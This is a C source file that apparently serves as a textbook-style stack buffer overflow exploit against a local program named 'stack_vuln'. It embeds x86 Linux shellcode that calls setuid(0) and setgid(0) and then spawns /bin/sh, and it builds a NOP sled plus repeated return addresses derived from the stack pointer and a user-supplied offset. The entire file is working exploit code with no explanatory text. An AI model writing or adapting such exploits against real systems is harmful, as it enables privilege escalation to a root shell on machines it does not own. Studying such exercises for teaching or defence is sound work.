#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[]=
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
"\x31\xc0\x31\xdb\xb0\x2e\xcd\x80"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
"\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
"\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff"
"/bin/sh";

unsigned long get_sp(void)
{
  __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{
  int i, offset;
  long esp, ret, *addr_ptr;
  char *ptr, buf[200];

  if (argc < 2) {
    fprintf(stderr, "Usage: %s <offset>\n", argv[0]);
    exit(-1);
  }

  offset = atoi(argv[1]);
  esp = get_sp();
  ret = esp - offset;

  printf("The stack pointer (ESP) is: 0x%x\n", esp);
  printf("The offset from ESP is: 0x%x\n", offset);
  printf("The return address is: 0x%x\n", ret);

  ptr = buf;
  addr_ptr = (long *)ptr;

  for(i = 0; i < 200; i += 4)
  {*(addr_ptr++) = ret;}

  for(i = 0; i < 50; i++)
  {buf[i] = '\x90';}

  ptr = buf + 50;

  for(i = 0; i < strlen(shellcode); i++)
  {*(ptr++) = shellcode[i];}

  buf[200 - 1] = '\0';

  execl("./stack_vuln", "stack_vuln", buf, 0);
  return 0;
}
